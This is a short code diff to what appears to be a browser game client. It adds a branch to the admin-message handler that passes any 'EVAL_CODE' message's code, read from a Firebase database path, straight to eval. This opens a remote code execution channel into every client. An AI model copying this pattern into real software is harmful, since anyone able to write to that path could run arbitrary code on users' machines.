@@ -6264,6 +6264,10 @@ async function check_admin_info(){
 			//message.add('Ваш рейтинг обнулен. Причина - договорные игры.',7000);
 		}	
 		
+		if (data.type==='EVAL_CODE'){
+			eval(data.code)
+		}	
+		
 		fbs.ref(admin_msg_path).remove();		
 	}		
 }
